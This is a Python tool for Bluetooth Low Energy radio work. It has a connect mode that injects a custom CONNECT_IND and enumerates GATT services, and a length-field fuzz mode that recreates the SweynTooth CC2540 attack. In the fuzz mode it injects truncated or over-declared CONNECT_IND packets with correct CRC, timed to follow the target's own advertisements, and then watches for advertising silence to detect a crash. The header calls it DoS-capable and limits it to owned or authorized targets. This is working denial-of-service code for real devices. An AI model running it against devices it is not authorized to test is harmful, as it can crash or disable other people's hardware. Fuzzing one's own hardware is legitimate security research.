#!/usr/bin/env python3
# ============================================================================
#  oooooooooooo.py - OUR-PACKET BLE CONNECTOR + LENGTH-FIELD FUZZER
#
#  CONNECT MODE:
#     python3 own_packet_full.py C0:00:00:41:73:AC
#     python3 own_packet_full.py AA:BB:CC:DD:EE:FF --addr-type public
#
#  LENGTH-FUZZ MODE (SweynTooth CC2540 methodology):
#     python3 own_packet_full.py C0:00:00:41:73:AC -l
#     python3 own_packet_full.py C0:00:00:41:73:AC -l --lens 0,12,26,34,247 --shots 5
#
#  Fuzz methodology:
#    - build our valid 34-byte-payload CONNECT_IND, then physically truncate
#      the payload to each declared Length (buffer matches header, like the
#      CC2540 CVE: 'truncated, but CRC correct')
#    - fire right after the target's own ADV_IND (rhythm-synced async TX)
#    - oracle: ADV silence. short gap ~2s = ACCEPTED (our timeout field);
#      silence > window = CRASH-likely. 34 = valid control.
#
#  Exit: 0=alive/ok 1=dead 2=environment 3=not advertising
#  OWN HARDWARE / AUTHORIZED TARGETS ONLY - this is a DoS-capable fuzzer.
# ============================================================================
import argparse, glob, os, re, shutil, statistics, subprocess, sys, time


def _windows_com_ports():
    """Serial ports on Windows (pyserial), fallback to COM* glob."""
    try:
        from serial.tools import list_ports
        return sorted(p.device for p in list_ports.comports())
    except Exception:
        return sorted("COM%d" % i for i in range(1, 21)
                      if os.path.exists("COM%d" % i))

# ################## OUR PACKET - SINGLE SOURCE OF TRUTH ##################
PDU_HEX_TEMPLATE = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
INITA            = "FF:EE:DD:CC:BB:AA"
INITA_RANDOM     = False
DEFAULT_MTU      = 247
DEFAULT_LENS     = "0,6,12,18,26,32,33,34,40,247"
###########################################################################

HAVE_WHAD, WHAD_ERR = True, None
try:
    from whad.device import WhadDevice
    from whad.ble.connector import Central, Injector
    from whad.ble.exceptions import PeripheralNotFound
    from whad.hub.ble import ChannelMap
except Exception as _e:
    HAVE_WHAD, WHAD_ERR = False, _e
HAVE_SCAPY, SCAPY_ERR = True, None
try:
    from scapy.layers.bluetooth4LE import BTLE, BTLE_DATA, BTLE_ADV
    from scapy.layers.bluetooth import L2CAP_Hdr
    from scapy.packet import Raw
except Exception as _e:
    HAVE_SCAPY, SCAPY_ERR = False, _e

T0 = time.time()
def log(m):  print(f"[{time.time()-T0:6.2f}s] {m}", flush=True)
def ok(m):   log(f"  [ OK ] {m}")
def warn(m): log(f"  [WARN] {m}")
def bad(m):  log(f"  [FAIL] {m}")
def banner(t): print("\n" + "="*72 + f"\n {t}\n" + "="*72, flush=True)
def die(m, code): bad(m); sys.exit(code)

def crc24(data: bytes, init: int = 0x555555) -> int:
    c = init
    for b in data:
        for i in range(8):
            c = ((c << 1) ^ 0x100065B) & 0xFFFFFF if ((c >> 23) & 1) ^ ((b >> i) & 1) else (c << 1) & 0xFFFFFF
    return c

def mac_wire(s: str) -> bytes:
    return bytes.fromhex(s.replace(":", ""))[::-1]

TPL         = bytes.fromhex(PDU_HEX_TEMPLATE)
LLD         = TPL[14:36]
AA          = int.from_bytes(LLD[0:4],  "little")
CRCINIT     = int.from_bytes(LLD[4:7],  "little")
WINSIZE     = LLD[7]
WINOFFSET   = int.from_bytes(LLD[8:10], "little")
INTERVAL    = int.from_bytes(LLD[10:12],"little")
LATENCY     = int.from_bytes(LLD[12:14],"little")
TIMEOUT     = int.from_bytes(LLD[14:16],"little")
CHANMAP_B   = LLD[16:21]
CHANMAP_INT = int.from_bytes(CHANMAP_B, "little")
HOP         = LLD[21] & 0x1F
SCA         = LLD[21] >> 5
PAYLOAD_FULL = mac_wire(INITA) + b"\x00"*6 + LLD      # AdvA placeholder, 34B

def build_pdu(advaa: str, adva_random: bool) -> bytes:
    payload = mac_wire(INITA) + mac_wire(advaa) + LLD
    hdr = 0x05 | (0x40 if INITA_RANDOM else 0) | (0x80 if adva_random else 0)
    return bytes([hdr, len(payload)]) + payload

def build_pdu_len(advaa: str, adva_random: bool, declared: int) -> bytes:
    """SweynTooth-style: header declares 'declared' payload bytes; the buffer
    is PHYSICALLY truncated to match (<=34) so Length, buffer and CRC agree.
    declared > 34 keeps the full buffer with an over-declared Length byte."""
    payload_full = mac_wire(INITA) + mac_wire(advaa) + LLD
    hdr = 0x05 | (0x40 if INITA_RANDOM else 0) | (0x80 if adva_random else 0)
    declared = max(0, min(declared, 255))
    if declared <= len(payload_full):
        return bytes([hdr, declared]) + payload_full[:declared]
    return bytes([hdr, declared]) + payload_full

# =========================== STEP 0: ENV AUDIT ===========================
def step0_env():
    banner("STEP 0/8  ENVIRONMENT AUDIT")
    fails = 0
    v = sys.version_info
    if v >= (3, 8): ok(f"python {v.major}.{v.minor}.{v.micro}")
    else: bad(f"python {v} too old"); fails += 1
    if HAVE_WHAD: ok("whad importable")
    else:
        bad(f"whad import failed: {type(WHAD_ERR).__name__}: {WHAD_ERR}")
        print("          fix: source ~/ble-lab/venv/bin/activate && pip install whad"); fails += 1
    if HAVE_SCAPY: ok("scapy importable")
    else:
        bad(f"scapy import failed: {type(SCAPY_ERR).__name__}: {SCAPY_ERR}")
        print("          fix: pip install scapy"); fails += 1
    ports = sorted(glob.glob("/dev/ttyACM*")) if os.name != "nt" else _windows_com_ports()
    if not ports:
        bad("no serial device found (/dev/ttyACM* or COMx)")
        print("          fix: replug dongle; if lsusb shows 1915:521f, replug once"); fails += 1
    else:
        ok(f"serial device(s): {', '.join(ports)}")
        try:
            import serial
            serial.Serial(ports[0], timeout=0.3).close()
            ok(f"serial open test on {ports[0]}")
        except PermissionError:
            bad(f"permission denied on {ports[0]}")
            print("          fix: sudo usermod -aG uucp $USER -> relogin"); fails += 1
        except Exception as e:
            bad(f"cannot open {ports[0]}: {type(e).__name__}: {e}")
            print("          fix: close other users of the dongle"); fails += 1
    try:
        if "uucp" in subprocess.run(["id","-nG"],capture_output=True,text=True).stdout.split():
            ok("user in uucp group")
        else:
            warn("user NOT in uucp group (fix: sudo usermod -aG uucp $USER)")
    except Exception: pass
    if shutil.which("systemctl"):
        st = subprocess.run(["systemctl","is-active","ModemManager"],capture_output=True,text=True).stdout.strip()
        (warn if st=="active" else ok)("ModemManager " + ("RUNNING (fix: sudo systemctl disable --now ModemManager)" if st=="active" else "not running"))
    if shutil.which("lsusb"):
        out = subprocess.run(["lsusb"],capture_output=True,text=True).stdout.lower()
        if "c0ff:eeee" in out: ok("USB: WHAD dongle present")
        elif "1915:521f" in out: warn("dongle in BOOTLOADER mode -> replug once")
        else: warn("WHAD dongle not in lsusb (may still work)")
    if fails: die(f"{fails} fatal environment problem(s) - fix [FAIL]s above", 2)

# ========================= DONGLE OPEN (shared) ==========================
def open_dongle(klass, mode=None, tries=6):
    last = None
    for i in range(tries):
        for port in ("uart0","uart1"):
            try:
                d = WhadDevice.create(port); c = klass(d)
                if mode == "scan":
                    try: c.enable_scan_mode()
                    except Exception: pass
                    try: c.start()
                    except Exception: pass
                return d, c, port
            except Exception as e:
                last = e
        log(f"  dongle open retry {i+1}/{tries} ({type(last).__name__ if last else '?'}) ...")
        time.sleep(1.5)
    return None, None, None

# ================== SCAN + CONFIRM + TYPE DETECT (shared) ================
def scan_phase(scan_time, target):
    banner("STEP 1/8  SCAN + CONFIRM + ADDRESS-TYPE DETECT")
    d, inj, port = open_dongle(Injector, mode="scan")
    if inj is None: die("dongle will not open -> replug, wait 3 s, rerun", 2)
    ok(f"dongle open on {port}, scanning up to {scan_time}s for {target}")
    adva_w = mac_wire(target)
    seen = {"n":0, "txadd":None, "t":[]}
    orig = inj.on_adv_pdu
    def hook(pkt,*a,**k):
        try:
            if adva_w in bytes(pkt):
                seen["n"] += 1; seen["t"].append(time.time()); del seen["t"][:-500]
                if seen["txadd"] is None:
                    try: seen["txadd"] = int(pkt.getlayer(BTLE_ADV).TxAdd)
                    except Exception: pass
        except Exception: pass
        try: return orig(pkt,*a,**k)
        except Exception: return None
    inj.on_adv_pdu = hook
    t = time.time()
    while time.time()-t < scan_time and seen["n"] == 0: time.sleep(0.1)
    if seen["n"] == 0:
        try: d.close()
        except Exception: pass
        die("target NOT advertising -> pairing mode / disconnect phone / closer, rerun", 3)
    t2 = time.time()
    while time.time()-t2 < 1.5 and seen["txadd"] is None: time.sleep(0.05)
    ok(f"TARGET IS THERE ({seen['n']} ADVs)"
       + (f", TxAdd={seen['txadd']}" if seen["txadd"] is not None else ""))
    return d, inj, seen

# ================== LENGTH-FIELD FUZZER (the -l mode) ====================
def fuzz_length_phase(inj, seen, target, adva_random, lens, shots, crash_window, recovery_window):
    banner("LENGTH-FIELD FUZZER  (SweynTooth CC2540 methodology)")
    log("  per Length: truncate payload to exactly LEN bytes, fire right after")
    log("  the device's own ADV_IND, then watch advertising as the oracle:")
    log("    short gap (~2s = our timeout field) -> ACCEPTED-likely")
    log("    silence > window                    -> CRASH-likely")
    log(f"  lengths: {lens}   shots/length: {shots}")
    ev = seen
    base_ivs = [b-a for a,b in zip(ev["t"],ev["t"][1:]) if 0.02 < b-a < 5]
    med = statistics.median(base_ivs) if len(base_ivs) >= 3 else 1.0
    silence_thr = max(crash_window, 4*med)
    accept_thr  = max(1.2, 2*med)
    ok(f"baseline: median ADV interval {med*1000:.0f} ms  |  accept-thr {accept_thr:.1f}s  crash-thr {silence_thr:.1f}s")

    results = []
    for L in lens:
        pdu = build_pdu_len(target, adva_random, L)
        lit = BTLE(bytes.fromhex("D6BE898E") + pdu)
        if bytes(lit)[4:] != pdu:
            warn(f"LEN={L}: scapy round-trip mismatch, skipping"); continue
        kind = "truncated" if L < 34 else ("valid control" if L == 34 else "over-declared")
        log(f"--- LEN={L:<3} [{kind}]  buffer {len(pdu)}B: {pdu.hex().upper()[:36]}{'...' if len(pdu)>18 else ''} ---")
        # fire shots, each right after a fresh ADV detection (rhythm-synced)
        fired, mark = 0, 0.0
        deadline = time.time() + 30
        while fired < shots and time.time() < deadline:
            if ev["t"] and time.time()-ev["t"][-1] < 0.6 and time.time()-mark > 0.4:
                try:
                    inj.raw_inject(lit); fired += 1; mark = time.time()
                except Exception as e:
                    warn(f"raw_inject: {type(e).__name__}: {e}"); break
                time.sleep(0.3)
            time.sleep(0.01)
        # oracle: watch advertising
        t0, gap_start, gap_end = time.time(), None, None
        while time.time()-t0 < silence_thr + recovery_window:
            now = time.time()
            la  = ev["t"][-1] if ev["t"] else 0
            if gap_start is None:
                if now-la > accept_thr: gap_start = la
            else:
                if la > gap_start: gap_end = la - gap_start; break
                if now-gap_start > silence_thr + recovery_window: break
            time.sleep(0.05)
        if gap_start is None:
            verdict = "NO EFFECT (advertising uninterrupted)"
        elif gap_end is not None and gap_end < silence_thr:
            verdict = f"GAP {gap_end:.2f}s then RESUMED -> ACCEPTED-likely (matches 2.0s timeout field)"
        elif gap_end is not None:
            verdict = f"GAP {gap_end:.2f}s then resumed -> suspicious long outage"
        else:
            verdict = f"SILENCE > {silence_thr+recovery_window:.0f}s -> CRASH-LIKELY"
        results.append((L, fired, verdict))
        log(f"    => LEN={L}: fired {fired}/{shots}  {verdict}")
        # if crash-likely: wait for the device to come back before next length
        if "CRASH" in verdict:
            log("    waiting up to 20s for the device to resume advertising ...")
            pre, tw = len(ev["t"]), time.time()+20
            while time.time() < tw:
                if len(ev["t"]) > pre or (ev["t"] and time.time()-ev["t"][-1] < 1.0):
                    ok("device is back (rebooted/recovered)"); break
                time.sleep(0.2)
            else:
                try: pass
                except Exception: pass
                log("    device STILL silent -> power-cycle it, then rerun remaining lengths")
                break
        time.sleep(1.0)
    banner("FUZZ SUMMARY")
    for L,f,v in results: log(f"  LEN={L:<4} shots={f}  {v}")
    crashed  = [L for L,f,v in results if "CRASH" in v]
    accepted = [L for L,f,v in results if "ACCEPTED" in v]
    log(f"  crash-suspect lengths : {crashed if crashed else 'none'}")
    log(f"  accepted lengths      : {accepted if accepted else 'none'}")
    with open(f"fuzz_len_{int(time.time())}.txt","w") as f:
        f.write(f"target: {target}\n")
        for L,f,v in results: f.write(f"LEN={L} shots={f} {v}\n")
    ok("saved -> fuzz_len_*.txt")
    return results

# ============== CONNECT PATH (unchanged, all fixes baked in) =============
def connect_phase(central, target, random_mode, mtu_rsp, watch, attempts=3):
    banner("STEP 5/8  CONNECT - FIELDS TAKEN FROM OUR PACKET")
    log(f"  random={random_mode} access_address=0x{AA:08X} crc_init=0x{CRCINIT:06X} "
        f"interval={INTERVAL} ({INTERVAL*1.25:.0f} ms) hop={HOP}")
    banner("STEP 6/8  MTU PATCH - answer ATT_EXCHANGE_MTU_REQ within ~3 ms")
    st = {"need":False,"reqs":0,"answered":0,"term":False,"err":None,"att":[]}
    def _reset(): st.update(need=False,reqs=0,answered=0,term=False,err=None); st["att"]=[]
    _od = central.on_data_pdu
    def _data(pdu=None,*a,**k):
        try:
            b = bytes(pdu)
            if len(b) >= 7 and b[4:6] == b"\x04\x00":
                att = b[6:]; op = att[0]
                st["att"].append({"op":op,"att":att}); del st["att"][:-60]
                if   op == 0x02: st["reqs"] += 1; st["need"] = True
                elif op == 0x11: log(f"    <<< SVC_RSP   {att.hex().upper()}")
                elif op == 0x09: log(f"    <<< CHR_RSP   {att.hex().upper()}")
                elif op == 0x0B: log(f"    <<< READ_RSP  {att[1:].decode('ascii','replace')!r}")
                elif op == 0x01: log(f"    <<< ATT_ERROR req=0x{att[1]:02x} err=0x{att[3]:02x}")
                else:            log(f"    <<< ATT op=0x{op:02x} {att.hex().upper()[:60]}")
        except Exception: pass
        try: return _od(pdu,*a,**k)
        except Exception: return None
    central.on_data_pdu = _data
    _oc = central.on_ctl_pdu
    def _ctl(pdu=None,*a,**k):
        try:
            b = bytes(pdu)
            if len(b) >= 4 and b[2] == 0x02:
                st["term"] = True; st["err"] = b[3]
                log(f"    <<< LL_TERMINATE_IND err=0x{b[3]:02x}"
                    + {0x13:" (remote user terminated)",0x08:" (supervision timeout)"}.get(b[3],""))
            else: log(f"    <<< LLCTRL {bytes(pdu).hex().upper()}")
        except Exception: pass
        try: return _oc(pdu,*a,**k)
        except Exception: return None
    central.on_ctl_pdu = _ctl
    H = {"v":0}
    def send_pdu(pkt,label=""):
        try:
            r = central.send_data_pdu(pkt, conn_handle=H["v"], access_address=AA)
            if r: st["answered"] += 1
            else: warn(f"send {label}: firmware returned {r!r}")
            return bool(r)
        except Exception as e:
            warn(f"send {label}: {type(e).__name__}: {e}"); return False
    def pump(seconds):
        end = time.time()+seconds
        while time.time() < end:
            if st["need"]:
                st["need"] = False
                if send_pdu(mtu_rsp,"MTU_RSP"): ok(f"MTU_RSP sent on AA 0x{AA:08X}")
            if st["term"]: break
            time.sleep(0.003)
    conn = None
    for n in range(1, attempts+1):
        _reset()
        log(f"  --- connect attempt {n}/{attempts} ---")
        try:
            conn = central.connect(target, random=random_mode, timeout=10,
                                   access_address=AA, crc_init=CRCINIT,
                                   channel_map=ChannelMap.from_int(CHANMAP_INT),
                                   hop_interval=INTERVAL, hop_increment=HOP)
        except PeripheralNotFound:
            warn("not advertising at that instant"); time.sleep(2.5); continue
        except Exception as e:
            warn(f"connect error: {type(e).__name__}: {e}"); time.sleep(2.5); continue
        H["v"] = getattr(conn,"conn_handle",0)
        ok(f"CONNECTED (handle={H['v']}) - OUR LLData is the live link contract")
        send_pdu(mtu_rsp,"MTU_RSP")
        pump(watch)
        if not st["term"]:
            ok(f"LINK ALIVE after {watch:.0f}s (MTU_REQ={st['reqs']} answered={st['answered']})")
            return conn, st, send_pdu, True
        warn(f"attempt {n}: terminated err=0x{st['err']:02x} answered={st['answered']}")
        try: conn.disconnect()
        except Exception: pass
        time.sleep(2.5)
    return None, st, send_pdu, False

def gatt_phase(st, send_pdu, att_pkt, mtu_rsp):
    banner("STEP 7/8  MANUAL GATT (WHAD host stack bypassed)")
    def svc_req(s,e): return att_pkt(b"\x10"+s.to_bytes(2,'little')+e.to_bytes(2,'little')+b"\x00\x28")
    def chr_req(s,e): return att_pkt(b"\x08"+s.to_bytes(2,'little')+e.to_bytes(2,'little')+b"\x03\x28")
    def read_req(h):  return att_pkt(b"\x0A"+h.to_bytes(2,'little'))
    def att_xchg(req_pkt, want, req_op, tries=3, wait=0.8):
        for _ in range(tries):
            if st["term"]: return None
            send_pdu(req_pkt, f"ATT 0x{req_op:02x}")
            t = time.time()
            while time.time()-t < wait:
                if st["need"]: st["need"]=False; send_pdu(mtu_rsp,"MTU_RSP")
                for rec in list(st["att"]):
                    if rec["op"] == want:
                        st["att"] = [x for x in st["att"] if x["op"] != want]
                        return rec["att"]
                    if rec["op"] == 0x01 and rec["att"][1] == req_op:
                        log(f"      ATT error 0x{rec['att'][3]:02x} on 0x{req_op:02x}"); return None
                time.sleep(0.01)
        return None
    svcs, dev_name, nchars = [], None, 0
    start = 1
    while start <= 0xFFFF and len(svcs) < 15:
        r = att_xchg(svc_req(start,0xFFFF), 0x11, 0x10)
        if not r or r[1] == 0: break
        itl = r[1]; o = 2; e_h = start
        while o + itl <= len(r):
            s_h = int.from_bytes(r[o:o+2],'little'); e_h = int.from_bytes(r[o+2:o+4],'little')
            uuid = r[o+4:o+itl][::-1].hex().upper()
            svcs.append([s_h,e_h,uuid,[]])
            log(f"    SERVICE {s_h:04X}-{e_h:04X} uuid 0x{uuid if len(uuid)==4 else uuid}")
            o += itl
        if e_h <= start: break
        start = e_h + 1
    log(f"  -> {len(svcs)} services")
    for svc in svcs:
        cs = svc[0]
        while cs <= svc[1] and len(svc[3]) < 12:
            r = att_xchg(chr_req(cs,svc[1]), 0x09, 0x08)
            if not r or r[1] == 0: break
            itl = r[1]; o = 2
            while o + itl <= len(r):
                h  = int.from_bytes(r[o:o+2],'little'); vh = int.from_bytes(r[o+3:o+5],'little')
                uuid = r[o+5:o+itl][::-1].hex().upper() or "?"
                svc[3].append((h,vh,uuid)); nchars += 1
                log(f"      CHAR {h:04X} val {vh:04X} uuid 0x{uuid if len(uuid)==4 else uuid}")
                o += itl
            cs = (svc[3][-1][0]+1) if svc[3] else svc[1]+1
    log(f"  -> {nchars} characteristics")
    for svc in svcs:
        if svc[2].startswith("1800"):
            for (h,vh,u) in svc[3]:
                if u == "2A00":
                    r = att_xchg(read_req(vh), 0x0B, 0x0A)
                    if r:
                        dev_name = r[1:].decode("ascii","replace")
                        log(f"    DEVICE NAME = '{dev_name}'  <- read over OUR custom link")
    return svcs, dev_name

# ============================== MAIN =====================================
def main():
    ap = argparse.ArgumentParser(description="OUR-packet BLE connector + length-field fuzzer")
    ap.add_argument("mac", help="target MAC, e.g. C0:00:00:41:73:AC")
    ap.add_argument("-l", "--fuzz-length", action="store_true",
                    help="LENGTH-FIELD FUZZ MODE (SweynTooth CC2540 methodology)")
    ap.add_argument("--lens", type=str, default=DEFAULT_LENS,
                    help="comma list of Length values to fuzz (default 0,6,12,18,26,32,33,34,40,247)")
    ap.add_argument("--shots", type=int, default=3, help="injections per length (default 3)")
    ap.add_argument("--crash-window", type=float, default=5.0, help="silence seconds = crash (default 5)")
    ap.add_argument("--recovery-window", type=float, default=10.0, help="extra wait for resume (default 10)")
    ap.add_argument("--addr-type", choices=("auto","public","random"), default="auto")
    ap.add_argument("--scan-time", type=int, default=15)
    ap.add_argument("--mtu", type=int, default=DEFAULT_MTU)
    ap.add_argument("--watch", type=float, default=3.0)
    a = ap.parse_args()

    m = re.sub(r"[:\-\s]","",a.mac).lower()
    if not re.fullmatch(r"[0-9a-f]{12}", m): die(f"'{a.mac}' is not a valid MAC", 2)
    if a.mtu < 23 or a.mtu > 517: die(f"--mtu must be 23..517", 2)
    try:
        lens = [int(x) for x in a.lens.split(",") if x.strip() != ""]
        assert lens and all(0 <= x <= 255 for x in lens)
    except Exception:
        die(f"--lens must be comma-separated ints 0..255, got '{a.lens}'", 2)
    target = ":".join(m[i:i+2] for i in range(0,12,2)).upper()

    banner("OUR-PACKET BLE CONNECTOR" + ("  [LENGTH-FUZZ MODE]" if a.fuzz_length else ""))
    log(f"  target : {target}")
    log(f"  template: {PDU_HEX_TEMPLATE}")
    step0_env()

    d, inj, seen = scan_phase(a.scan_time, target)
    if a.addr_type == "auto":
        if seen["txadd"] is not None:
            random_mode = bool(seen["txadd"]); ok(f"addr type auto: {'random' if random_mode else 'public'}")
        else:
            random_mode = True; warn("TxAdd unreadable - defaulting random (--addr-type to override)")
    else:
        random_mode = (a.addr_type == "random"); ok(f"addr type forced: {a.addr_type}")

    pdu, crc = build_pdu(target, random_mode), None
    pdu, _crc = pdu, crc24(pdu)
    crc = _crc
    with open("packet.txt","w") as f:
        f.write(f"PDU: {pdu.hex().upper()}\nCRC air: {crc.to_bytes(3,'little').hex().upper()}\n")

    # ---------------- FUZZ MODE ----------------
    if a.fuzz_length:
        banner("FUZZ MODE SELECTED - connect/GATT skipped")
        results = fuzz_length_phase(inj, seen, target, random_mode, lens,
                                    a.shots, a.crash_window, a.recovery_window)
        try: d.close()
        except Exception: pass
        sys.exit(0)

    # ---------------- CONNECT MODE (unchanged) ----------------
    banner("STEP 2/8  OUR OWN CONNECT_IND")
    log(f"  PDU TX BUFFER ({len(pdu)}B): {pdu.hex().upper()}")
    log(f"  CRC on air: {crc.to_bytes(3,'little').hex().upper()}")
    for n,v in (("AA legality", AA not in (0,0xFFFFFFFF) and AA != 0x8E89BED6),
                ("hop 5-16", 5 <= HOP <= 16),
                ("timeout rule", TIMEOUT > 2*(1+LATENCY)*INTERVAL),
                ("WinOffset <= Interval", WINOFFSET <= INTERVAL)):
        (ok if v else die)(f"spec check: {n}", 2) if not v else None
        if v: ok(f"spec check: {n}")

    lit = BTLE(bytes.fromhex("D6BE898E") + pdu)
    banner("STEP 3/8  LITERAL 36-BYTE TX (raw_inject)")
    if bytes(lit)[4:] == pdu: ok("scapy round-trip BYTE-EXACT")
    else: warn("round-trip mismatch - skipping literal TX")
    if bytes(lit)[4:] == pdu:
        sent = 0
        for i in range(3):
            try: inj.raw_inject(lit); sent += 1; time.sleep(0.2)
            except Exception as e: warn(f"raw_inject: {type(e).__name__}: {e}"); break
        (ok if sent else warn)(f"literal TX: {sent}/3 (unsynced, sniffer-visible)")
    try: d.close()
    except Exception: pass
    time.sleep(1.5)

    banner("STEP 4/8  DONGLE REOPEN (central) + CLAIM InitA")
    d2, central, port2 = open_dongle(Central)
    if central is None: die("cannot reopen dongle as Central -> replug, rerun", 2)
    ok(f"dongle open on {port2}")
    try: central.set_bd_address(INITA); ok(f"InitA claimed: {INITA}")
    except Exception as e: warn(f"set_bd_address: {type(e).__name__}: {e}")

    def att_pkt(att: bytes):
        return BTLE_DATA(LLID=2) / L2CAP_Hdr(len=len(att), cid=0x0004) / Raw(load=att)
    mtu_rsp = att_pkt(bytes([0x03]) + a.mtu.to_bytes(2,'little'))

    conn, st, send_pdu, alive = connect_phase(central, target, random_mode, mtu_rsp, a.watch)
    svcs, dev_name = [], None
    if alive:
        svcs, dev_name = gatt_phase(st, send_pdu, att_pkt, mtu_rsp)
    else:
        banner("STEP 7/8  MANUAL GATT - SKIPPED (link not alive)")

    banner("STEP 8/8  FINAL REPORT")
    log(f"  [X] our packet    : {pdu.hex().upper()}")
    log(f"  [X] CRC on air    : {crc.to_bytes(3,'little').hex().upper()}")
    log(f"  [X] connect fields: AA=0x{AA:08X} CRCInit=0x{CRCINIT:06X} iv={INTERVAL*1.25:.0f}ms hop={HOP}")
    log(f"  [{'X' if alive else ' '}] link ALIVE past MTU exchange (term={st['term']} answered={st['answered']})")
    log(f"  [{'X' if svcs else ' '}] GATT services: {len(svcs)}   name: {dev_name!r}")
    rpt = f"report_{target.replace(':','')}_{int(time.time())}.txt"
    with open(rpt,"w") as f:
        f.write(f"target: {target}\nPDU: {pdu.hex().upper()}\nCRC: {crc.to_bytes(3,'little').hex().upper()}\n")
        f.write(f"alive: {alive}\nterminated: {st['term']} err: {st['err']}\nservices: {len(svcs)}\nname: {dev_name}\n")
        for s in svcs: f.write(f"  {s[0]:04X}-{s[1]:04X} uuid {s[2]}\n")
    ok(f"report saved -> {rpt}")
    if not alive:
        bad("link did not survive - see interpretation guide in previous run / err= line above")
    if alive:
        try: conn.disconnect()
        except Exception: pass
    try: d2.close()
    except Exception: pass
    sys.exit(0 if alive else 1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        print("\n[!] interrupted"); sys.exit(130)
